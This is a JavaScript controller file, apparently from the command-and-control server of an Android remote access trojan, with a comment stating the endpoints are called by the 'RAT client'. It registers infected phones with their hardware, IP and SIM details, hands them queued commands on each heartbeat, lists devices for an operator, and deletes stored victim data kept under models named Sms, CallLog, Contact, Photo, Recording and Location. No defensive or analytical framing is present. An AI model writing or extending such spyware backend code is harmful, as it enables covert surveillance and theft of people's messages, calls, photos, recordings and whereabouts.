const Device = require('../models/Device');
const Command = require('../models/Command');

// @desc    Register or update device (called by RAT client)
// @route   POST /api/devices/register
const registerDevice = async (req, res) => {
  try {
    const {
      deviceId, deviceName, manufacturer, model,
      androidVersion, sdkVersion, ipAddress,
      batteryLevel, isCharging, networkType,
      simInfo, totalStorage, usedStorage,
    } = req.body;

    const update = {
      $set: {
        isOnline: true,
        lastSeen: new Date(),
      },
      $setOnInsert: {
        firstConnected: new Date(),
      },
    };

    if (deviceName) update.$set.deviceName = deviceName;
    if (manufacturer) update.$set.manufacturer = manufacturer;
    if (model) update.$set.model = model;
    if (androidVersion) update.$set.androidVersion = androidVersion;
    if (sdkVersion) update.$set.sdkVersion = sdkVersion;
    if (ipAddress) update.$set.ipAddress = ipAddress;
    if (batteryLevel !== undefined) update.$set.batteryLevel = batteryLevel;
    if (isCharging !== undefined) update.$set.isCharging = isCharging;
    if (networkType) update.$set.networkType = networkType;
    if (simInfo) update.$set.simInfo = simInfo;
    if (totalStorage) update.$set.totalStorage = totalStorage;
    if (usedStorage) update.$set.usedStorage = usedStorage;

    const device = await Device.findOneAndUpdate(
      { deviceId },
      update,
      { upsert: true, new: true }
    );

    // Return pending commands for this device
    const pendingCommands = await Command.find({
      deviceId,
      status: { $in: ['pending', 'sent'] },
    }).sort({ createdAt: 1 });

    res.json({
      success: true,
      device: {
        id: device._id,
        deviceId: device.deviceId,
        isHidden: device.isHidden,
      },
      pendingCommands: pendingCommands.map((cmd) => ({
        id: cmd._id,
        type: cmd.type,
        params: cmd.params,
      })),
    });
  } catch (error) {
    console.error('Register device error:', error.message);
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Update device heartbeat (online status)
// @route   POST /api/devices/heartbeat
const heartbeat = async (req, res) => {
  try {
    const { deviceId, batteryLevel, isCharging } = req.body;

    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }

    device.isOnline = true;
    device.lastSeen = new Date();
    if (batteryLevel !== undefined) device.batteryLevel = batteryLevel;
    if (isCharging !== undefined) device.isCharging = isCharging;
    await device.save();

    // Return pending commands
    const pendingCommands = await Command.find({
      deviceId,
      status: { $in: ['pending', 'sent'] },
    }).sort({ createdAt: 1 });

    res.json({
      success: true,
      pendingCommands: pendingCommands.map((cmd) => ({
        id: cmd._id,
        type: cmd.type,
        params: cmd.params,
      })),
    });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Get all devices (admin)
// @route   GET /api/devices
const getAllDevices = async (req, res) => {
  try {
    const { status, search } = req.query;

    let query = {};
    if (status === 'online') query.isOnline = true;
    if (status === 'offline') query.isOnline = false;

    if (search) {
      query.$or = [
        { deviceName: { $regex: search, $options: 'i' } },
        { deviceId: { $regex: search, $options: 'i' } },
        { manufacturer: { $regex: search, $options: 'i' } },
        { model: { $regex: search, $options: 'i' } },
      ];
    }

    const devices = await Device.find(query).sort({ lastSeen: -1 });

    res.json({
      success: true,
      count: devices.length,
      devices,
    });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Get single device details
// @route   GET /api/devices/:deviceId
const getDevice = async (req, res) => {
  try {
    const device = await Device.findOne({ deviceId: req.params.deviceId });
    if (!device) {
      return res.status(404).json({ success: false, message: 'Device not found' });
    }
    res.json({ success: true, device });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

// @desc    Delete device and all associated data
// @route   DELETE /api/devices/:deviceId
const deleteDevice = async (req, res) => {
  try {
    const { deviceId } = req.params;

    await Device.findOneAndDelete({ deviceId });
    await Command.deleteMany({ deviceId });
    const Location = require('../models/Location');
    const Sms = require('../models/Sms');
    const CallLog = require('../models/CallLog');
    const Contact = require('../models/Contact');
    const Photo = require('../models/Photo');
    const Recording = require('../models/Recording');

    await Promise.all([
      Location.deleteMany({ deviceId }),
      Sms.deleteMany({ deviceId }),
      CallLog.deleteMany({ deviceId }),
      Contact.deleteMany({ deviceId }),
      Photo.deleteMany({ deviceId }),
      Recording.deleteMany({ deviceId }),
    ]);

    res.json({ success: true, message: 'Device and all data deleted' });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
};

module.exports = {
  registerDevice,
  heartbeat,
  getAllDevices,
  getDevice,
  deleteDevice,
};

